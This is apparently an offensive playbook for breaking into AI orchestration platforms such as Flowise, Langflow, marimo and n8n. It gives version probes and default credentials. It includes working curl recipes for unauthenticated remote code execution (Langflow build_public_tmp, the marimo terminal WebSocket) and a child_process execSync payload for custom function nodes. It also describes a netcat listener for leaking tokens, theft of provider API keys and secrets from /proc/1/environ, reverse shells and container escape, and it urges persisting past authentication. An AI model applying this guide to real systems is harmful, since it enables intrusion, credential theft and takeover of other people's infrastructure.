# Archetype: AI Orchestration / LLM Platform

**Match if you see:** Flowise, LangChain Server, AnythingLLM, Dify, n8n,
LiteLLM, ChatBot UIs, OpenWebUI, **Langflow** (visual flow builder,
`/api/v1/version`), **marimo** (reactive Python notebook, login titled
"marimo"), anything that exposes LLM workflows / notebooks as a web app.

## Why these are juicy

LLM orchestration platforms are a goldmine because they:
- Run untrusted code as a feature (custom function nodes, tool nodes)
- Expose API keys to multiple LLM providers in their config
- Often ship with weak default auth, demo accounts, or "open by default" modes
- Have multiple HTTP endpoints — many added recently and lightly tested
- Almost always run as root or in containers with mounted secrets

## Fast checks (≤ 5 min)

```bash
# 1) Identify version
curl -s http://target/api/v1/version           # Flowise
curl -s http://target/api/v1/info               # n8n
curl -s http://target/api/version               # AnythingLLM
curl -s http://target/api/health                # generic
curl -s http://target/.well-known/version

# 2) Common unauth endpoints (Flowise specifically)
curl -s http://target/api/v1/public-chatflows
curl -s http://target/api/v1/public-chatbotConfig/<id>
curl -s http://target/api/v1/get-upload-file
curl -s http://target/api/v1/prediction/<id>    # may be unauth even if UI requires login

# 3) Look for API docs / Swagger
curl -s http://target/api/docs
curl -s http://target/swagger
curl -s http://target/openapi.json
curl -s http://target/api/v1/spec

# 4) Default creds (try BEFORE brute force)
admin / admin
admin / changeme
admin / password
admin@flowise.com / admin
admin@example.com / admin
```

## Deep checks

### A. Source dive (do this BEFORE giving up on auth)
```bash
# Flowise
bash scripts/source-dive.sh FlowiseAI/Flowise <version-tag>
# n8n
bash scripts/source-dive.sh n8n-io/n8n <version-tag>
# AnythingLLM
bash scripts/source-dive.sh Mintplex-Labs/anything-llm
# Dify
bash scripts/source-dive.sh langgenius/dify
```

Then read the generated `source-dive.md`:
- **Section A** → routes that bypass auth
- **Section C** → auth middleware (look for header bypasses like `x-request-from`, `127.0.0.1`)
- **Section I** → recent security commits = your CVE map

### B. Known CVEs to try (Flowise)
- **CVE-2025-59528** (Flowise ≤ 3.0.5) — RCE via CustomMCP node, requires auth.
  PoCs: `maradonam18/CVE-2025-59528-PoC`, exploit-db `nltt0`.
- **CVE-2024-31621** (Flowise < 1.6.5) — auth bypass via `x-request-from` header.
- **CVE-2025-26319** — pre-auth file upload + RCE in custom function loader.

### B2. Langflow — unauth RCE via public build endpoint

Version-gate first: `curl -s http://target/api/v1/version` → **≤ 1.8.2 is
vulnerable**. You also need any flow id (a public playground link, or
`GET /api/v1/flows/public_flow/{id}`); `/api/v1/auto_login` is not needed.

| Version | CVE | Vector |
|---|---|---|
| ≤ 1.8.2 | **CVE-2026-33017** | unauth RCE, `POST /api/v1/build_public_tmp/{flow_id}/flow` |
| < 1.3.0 | CVE-2025-3248 | unauth RCE via `/api/v1/validate/code` (older code-validate sink) |

Exact shape (skill `langflow-rce` has the full recipe):
```bash
# 1) build: Cookie client_id is MANDATORY (400 "No client_id cookie found" without it)
curl -s -X POST http://target/api/v1/build_public_tmp/<flow_id>/flow \
  -H 'Cookie: client_id=00000000-0000-0000-0000-000000000000' \
  -H 'Content-Type: application/json' \
  -d '{"data":{"nodes":[<genericNode: template._type="Component", template.code.value=PYSRC>],
        "edges":[],"viewport":{"x":0,"y":0,"zoom":1}}}'
# -> {"job_id": ...}  NOTHING has executed yet.
# 2) TRIGGER: poll events (same client_id) — THIS runs the code:
curl -s http://target/api/v1/build_public_tmp/<job_id>/events -H 'Cookie: client_id=00000000-0000-0000-0000-000000000000'
```
PYSRC must define a valid `langflow.custom.Component` subclass (Output + `run`)
or the build fails before `exec()`. Module-level code must be Assignments/
FunctionDefs (`_x = __import__('os')...`); imports go *inside* a `def`.
Short output exfils via a `ValueError` (error event `data.text`, ~460-char cap);
anything larger → reverse shell in a daemon thread.

### B3. marimo — pre-auth terminal RCE (edit mode)

Version-gate: the served notebook header `__generated_with = "<version>"` →
**< 0.23.0 is vulnerable**. Needs `marimo edit` (not `marimo run`); login page
titled "marimo", `GET /healthz` → `{"status":"healthy"}` unauth.

| Version | CVE | Vector |
|---|---|---|
| < 0.23.0 | **CVE-2026-39987** | pre-auth RCE via `/terminal/ws` WebSocket → PTY as the marimo user |

- **404 trap:** plain `GET /terminal/ws` → **404** (websocket-only route). That
  is NOT "endpoint absent" — test with a real upgrade handshake
  (`Connection: Upgrade`, `Upgrade: websocket`, `Sec-WebSocket-Key`,
  `Sec-WebSocket-Version: 13`, no auth). `101 Switching Protocols` = shell.
- The `--token` value (from `ps aux` / systemd cmdline:
  `marimo edit ... --token *** <TOKEN>`) doubles as the login password
  (`POST /auth/login`, form-encoded `password=<token>`).
- Skill `marimo-terminal-rce` has the masked-frame / one-shot WS mechanics.

### C. Custom tool / function abuse (post-auth)
If you get auth (default creds, leaked token, registered account):
- Create a chatflow with a "Custom Function" node containing
  `process.mainModule.require('child_process').execSync('id').toString()`
- Or "Custom Tool" with shell escape in the description/example.
- Test prompts → execution.

### D. Webhook callbacks
Many AI platforms accept user-controlled webhook URLs. Point one at your
listener (`nc -lnvp 4444`) to leak headers including auth tokens.

### E. Provider key extraction
After auth, hit `/api/v1/credentials` → it usually returns provider API keys
(OpenAI, Anthropic, etc). These are valuable in their own right and may be
reusable for further pivoting (e.g. AWS keys).

## Common pitfalls (the silentium failure mode)

1. **"Needs auth → I give up"** — DON'T. Source-dive first. Most of these apps
   have at least 2-3 unauth endpoints by design.
2. **Trying default creds and stopping** — also try registering a new account
   (often allowed by default). Also try the team-page emails as usernames.
3. **Treating SPA 200s as files** — every path returns the SPA HTML. Don't
   trust ffuf size matches; check actual response.
4. **Ignoring the `/api/v1/prediction` endpoint** — sometimes the chatflow ID
   is guessable (`test`, `demo`, sequential UUIDs leaked elsewhere).

## Pivot targets after access

- `~/.flowise/database.sqlite` — user table, hashed pw, encrypted creds
- `~/.flowise/encryption.key` — decrypts those creds
- `/etc/flowise/.env` — provider keys
- Container env vars (`/proc/1/environ`) — Langflow leaks
  `LANGFLOW_SUPERUSER_PASSWORD` / `LANGFLOW_SECRET_KEY`; a prime SSH
  password-reuse candidate. marimo/other services leak secrets in their
  process cmdline (`--token ...`).
- Host SSH keys (since these platforms often run as root or with `--privileged`)

## Matching skills

`langflow-rce` (CVE-2026-33017, unauth RCE) · `marimo-terminal-rce`
(CVE-2026-39987, pre-auth WS RCE) · `container-escape-techniques` /
`sandbox-escape-techniques` (these platforms run untrusted code; escape the
worker/container) · `node-inspector-privesc` (Node-based UIs with `--inspect`) ·
`reverse-shell-techniques` + `single-exec-listener-lifecycle`.
